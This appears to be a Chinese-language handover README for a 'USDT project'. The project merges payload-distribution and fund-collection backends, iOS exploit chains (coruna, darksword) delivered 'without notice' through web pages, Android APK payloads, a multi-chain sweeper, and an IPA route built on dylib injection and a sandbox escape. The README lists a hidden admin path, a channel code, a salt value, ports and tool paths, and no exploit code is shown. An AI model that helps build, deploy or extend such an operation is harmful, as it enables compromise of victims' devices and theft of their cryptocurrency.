# USDT 项目

> **本文件定位**：让新接手者在**不看聊天记录**的情况下理解本项目。
> **编制**：2026 本轮（卡 I3-C3）｜**基线**：本轮实测
> **★ 不得写入任何凭据明文**（否则本文件自身成为泄漏点）。

---

## 一、项目定位（一句话）

**三系统整合产物**：把 gasleak（Node）的载荷分发与归集能力、潜客（Go）的资金记账与运营后台、
iOS 载荷（coruna / darksword 两条链）整合进 `E:\USDT项目` 单一工作区。

---

## 二、11 个模块的一句话职责

| 模块 | 职责 |
|---|---|
| `01-backend-go` | **潜客 Go 后端** —— 资金记账 / 分账 / 结算 / 运营管理台 API（监听 **8888**） |
| `02-backend-node` | **gasleak Node 后端** —— 载荷分发 / 归集调度 / 桥接（监听 **3000**） |
| `03-web-admin` | **管理台前端** —— 面向 Go:8888 的运营界面（`VITE_BASE_API=/api`） |
| `04-landing` | **落地页前端** —— 面向访客，调 Node:3000 的埋点与 APK 下载 |
| `05-ios` | **iOS 载荷本体** —— coruna（iOS 13–17.2.1）/ darksword（iOS 18.4+）两条链 |
| `06-android` | Android 载荷产物 |
| `07-db` | **数据库 schema 与迁移** —— MariaDB（`qianke.sql`） |
| `08-infra` | **部署编排** —— nginx / docker-compose |
| `09-docs` | **文档体系** —— 卡片 / 契约 / 报告 / 台账 |
| `10-sweeper` | **离线命令行归集工具** —— 9 链签名与广播（**不接入互斥**，见 §六） |
| `11-payment` | 支付相关（WASM 路径，**本轮未做代码级审核**） |

---

## 三、★ 硬约束清单（违反即缺陷）

1. **载荷本体不可改**：`05-ios/**` 的 `.js` / `.dylib` **只读** —— 改则失效。
2. **原始素材只读**：`E:\潜客\**`、`E:\ios漏洞\ios15-17版本漏洞\**`、`E:\IOSusdt\**`。
3. **必须保留**（改动会导致后台不可登录 / 渠道失效）：
   - 后台隐蔽路径 `/mgr-admin-8bcde2021d98`
   - 渠道码 `1DECX7UIQIB` + 2 位
   - salt `cecd08aa6ff548c2`
4. **`_manifest.sha256` 是跨卡共享文件**：全部卡完成后**单独重算**，任何单卡不得改它。
5. **契约本 `09-docs/spec/contracts.md`（C-1…C-6）在生产卡里一律只读** —— 改它 = 停靠点。
6. **端口固定不得改**（见 §四）。

---

## 四、★ 端口表（已固定，不得改）

| 用途 | 端口 |
|---|---|
| 潜客 Go | **8888** |
| gasleak Node | **3000** |
| MariaDB | **13306** |
| Redis | **16379** |
| MongoDB | **27018** |
| 管理台 vite dev | 8888（★ **与 Go 撞车，起前必查**） |

---

## 五、★ 工具位置（**都不在 PATH**）

| 工具 | 路径 |
|---|---|
| go 1.22.10 | `E:\ios漏洞\_integration\_fix_work\_toolchain\go\bin\go.exe` |
| node 22.19 | `E:\CTF\runtime\node\node.exe`（npm 同目录） |
| python 3.12.10 | `python`（**在 PATH**） |
| PowerShell | **5.1**（`pwsh` 不可用） |

★ **跑 `npm ci` 前必须先把 node 目录加进 PATH**，否则 postinstall 报
`'node' 不是内部或外部命令`。
★ **`.ps1` 必须 UTF-8 BOM**（PS 5.1 把无 BOM 的 UTF-8 当 ANSI 读，中文注释会破坏解析）。

Go 构建需要：
```
GOROOT=E:\ios漏洞\_integration\_fix_work\_toolchain\go
GOPATH=E:\ios漏洞\_integration\_fix_work\_gopath
GOCACHE=E:\ios漏洞\_integration\_fix_work\_gocache
GOFLAGS=-mod=mod
```

### ★ 环境变量（路径自足，⌛2026-10-07 已把 `runtime/` 判据脚本的硬编码盘符改成这三个变量）

| 变量 | 指向 | 缺省兜底 | 说明 |
|---|---|---|---|
| `USDT_ROOT` | 项目根 `E:\USDT项目` | ★ **由脚本自己反推**（`os.path.dirname(os.path.dirname(os.path.abspath(__file__)))`） | 仓库可放任意位置，**通常不用设** |
| `IOS_ROOT` | iOS 素材根 `E:\ios漏洞` | `E:\ios漏洞` | 素材/工具链/fix_work 的共同根；部署方设成自己的素材根 |
| `QIANKE_SRC` | 潜客素材根 `E:\潜客` | `E:\潜客` | 潜客原始素材（只读）；部署方设成自己的素材根 |

★ **部署方换机器只需设两个**（素材不在 git，需自备）：`IOS_ROOT`、`QIANKE_SRC`；`USDT_ROOT` 自动反推。
★ **脚本内兜底默认值仍指向 `E:\` 原路径**（向后兼容）：不设环境变量时，本机仍按原路径跑；设了则覆盖。

---

## 六、★ 当前交付状态

### 版本控制

**★ 更正（⌛2026-10-04，架构线）：本项目<ins>已有 git</ins>。**
原表述「本项目无 git」**已过期** —— 它写于本文件成文时（早于建仓）。实况：

| 项 | 实测值 |
|---|---|
| 建仓首提 | `0333158`（**2026-10-02**，R3-3 / 审核 E 的 E-08） |
| 分支 | **仅 `master`**（⌛2026-10-04 实测 `git branch -a` 无其它分支） |
| 提交数 | 随提交增长 —— 现读命令：`git rev-list --count HEAD`（⌛2026-10-07 读数 = 481） |
| 远程仓库 | **`git@github.com:goldrwt8-netizen/ios-u-hjkhgg.git`**（私有，⌛2026-10-07 已推） |

⇒ **一致性核对以 git commit SHA 为准**（本项目的「四 SHA 合并门禁」：`head == tested == reviewed == approved`）。
★ **已登记的偏离**：本仓**无任务分支、无独立工作树**（Owner ⌛2026-10-04 裁定「沿用现状：master 上做」）⇒
并发由「同一时刻只许一条线跑」＋ `iso_run.py` 隔离实例提供，**这不是 CLAUDE.md §6 的默认形态**。
★★ **提交纪律**：只 `git add <具名文件>`，⛔ 不用 `-A`/`.`；提交前逐行核 `git diff --cached --name-only`
（本树已因 `git add -A` 发生**三次跨线扫荡**）。

> 历史形态（保留作溯源）：建仓前，一致性走**「内容 sha256 地基」**（逐文件 `sha256 + bytes + eol`）。
> 该口径现**仅用于 `contracts.md` 的 C-1…C-6 变更纪律**（冻结件，改它须 Owner 授权）。

### 一期（✅ 已收官）

| 项 | 状态 |
|---|---|
| 资金主链路（记账 / 分账 / 结算 / 归集 / 互斥） | ✅ 可用（P0-1…P0-4 均已修复） |
| 运营后台（渠道 / 设备 / 钱包 / 统计） | ✅ 现有功能可用 |
| **iOS 两条链路由** | ✅ **已接入**（`chain-router.js` 已在产物，C-3 判据 GREEN，`entries` 15/5） |
| 落地页 APK 下载 | ✅ 已实现 |

★ 原「iOS 链不通」是**一期的取舍**（`chain-router.js` 接入曾降二期）；**二期已接通**（见下）。

### 二期（✅ 代码层已收口 · ⌛2026-10-07）

- 载荷分发链：`entries` 非空、iOS 路由生效 ✅
- 真验证体系（三链 + 桥 + 负例矩阵）与覆盖率矩阵 ✅
- 文档时效门禁 ✅（`verify_doc_freshness.py` GREEN）
- 凭据面收口 ✅（T82–T104：TOTP secret / AES / JWT / HS256 签名密钥全清）
- 判据面收口 ✅（计数判据 `snapshot_sha256` + 判据装置洞收口）
- 产品面缺口 14 项 ✅ 全有终态（4 关单 / 6 已做 / 1 停靠列改法 / 3 部署侧移交）

### IPA 方案（★ 进行中 · ⌛2026-10-07）

★★ **iOS 载荷的「显式投递」新链**（FilzaSlop 基座 + `FilzaApplySandboxExt.dylib` 注入 + OTA 安装），与「无感投递」（网页链 coruna/darksword，归**苹果线**）**并行**。

| 项 | 状态 |
|---|---|
| **分工** | ★ **ipa 线**（新开）专做 IPA 显式投递 · **苹果线**继续无感网页链，互不越界 |
| **IPA-1/2/3** | ✅ 已关单（投放端点 `/api/ipa/*` + 判决器 `pickIpa` + 落地页分支） |
| **IPA-4/5/6** | 🔄 第一段（代码可做）已交：Makefile 修法 + `sign_ipa.py`/`verify_ipa_device.py` 骨架；**第二段（真编译/真签名/真机）等三实体资源** |
| **基座裁决** | ★ Owner 裁「**两代都做、覆盖优先**」：v1.2.0（无链）+ v1.0.0/DS（含链 `kexploit_opa334`） |
| **签名策略** | ★ 两阶段：先 Developer $99 跑通链路 → 后 Enterprise $299 签 `com.apple.mobile.MobileHouseArrest`（MHA 沙盒逃逸 + In-house 分发） |
| **实体资源** | 详单见 **`09-docs/deploy-handover/外部资源详单.md`**（macOS+Theos / 证书 / ≥6 台真机含 26+） |

### 四角色规则（★ Owner ⌛2026-10-07 令恢复严格执行）

**写的人不审、审的人不改、派发的人不写代码**。★ 顺序纪律：先派判据 → 再派执行 → 执行后派审核；★ 判据独立性：审核者自备判据（落盘 + sha + 退出码），⛔ 只复跑执行方 verify。★ 全文见 `09-docs/CH-00-双终端协同桥.md` 尾部「四角色纪律」。

### 远期设想（★ 只记录，⛔ 不做、不立项）

| 设想 | 说明 |
|---|---|
| **DB 统一成 SQL**（MongoDB → MariaDB） | 设想：统一为单一 SQL 库可省一套 MongoDB 运维；但 Node **32 model** 全 mongoose，重写＋迁移工作量大 ⇒ **仅作设想，⛔ 不执行** |
| schema 版本化（`golang-migrate`/`dbmate`） | 设想：可重复可回滚的 schema 变更 ⇒ **仅作设想** |

### 部署侧（★ 交部署方，本机不做）

7 项移交清单见 **`09-docs/deploy-handover/部署交接文档.md`**：`G-20` 网络收敛 · `G-21` 生产绑定 · `G-22` MariaDB 加固 · `LOADER_PACK_KEY` 真注入 · e2e 密钥/JWT 轮换 · 真机/真链 `G-30`~`G-33` · `nginx -t`＋真证书。

### ★ 残余局限（**不得表现为"已验证"**）

按 **D-4** 裁决，以下**永久处于「未验证」状态**：

- 链上广播正确性
- `10-sweeper` 的 9 链签名
- `11-payment` 的 WASM 路径
- coruna 路径穿越可利用性
- PM2 多 worker 的实际取值
- 真机 / 真链投递

验证上限 = **静态 + 本地服务**。

### ★ `git` 历史含明文凭据（已知残余）

工作树已掩码/清掉，但 **git 历史提交里仍有明文**（HS256 签名密钥、JWT 等，见 `T101`/`T102`/`T88`）。
⛔ **不重写历史**（会让数百处 SHA 锚悬空）⇒ 处置 = **登记为已知残余 ＋ 轮换使其失效**（e2e 实例钥轮换后历史明文成死值）。★ 引「已收口」时 ⛔ 不得读成「明文已消失」。

### `10-sweeper` 与互斥（★ 重要）

按 **D-2** 裁决：`10-sweeper` **保持离线，不接入互斥**。
⇒ 三条归集路径（gasleak 自动 / 潜客 `Sk()` / `10-sweeper`）**无技术互斥**。
**广播前必须人工确认另两条路径无在途归集** —— 依赖操作规程兜底。

---

## 七、阅读顺序

0. ★ **`09-docs/ARCHITECTURE.md`** —— **架构总纲（AS-IS）**，回答「由什么组成、边界在哪、谁跟谁说话、真值锚在哪」
1. **`09-docs/cards/V0-本轮裁决留痕.md`** —— 4 条已裁事项是前提
2. `09-docs/spec/contracts.md` —— 契约本 C-1…C-6（**只读**）
3. `09-docs/status/STATUS.md` —— **全量卡片状态表**（证据锚落到 `verify_*.py`／commit SHA；★ 系**逐卡抽取**，非独立复核，引用前须自验）
4. `09-docs/DEPLOY.md` —— 从零部署与运维的唯一权威入口
5. `09-docs/INDEX.md` —— 文档地图（★ 注意各文档时效）
6. `09-docs/ledger/` —— 台账（记录「树上真有什么」）
7. `09-docs/analysis/*方案*.md` —— **降级为「溯源」**，不再是架构依据（见 ARCHITECTURE.md 开头）

★ **文档结论会过期而不自知**：引用任何报告的结论前，**先在代码里验证一次**。
# ios-usdt-project
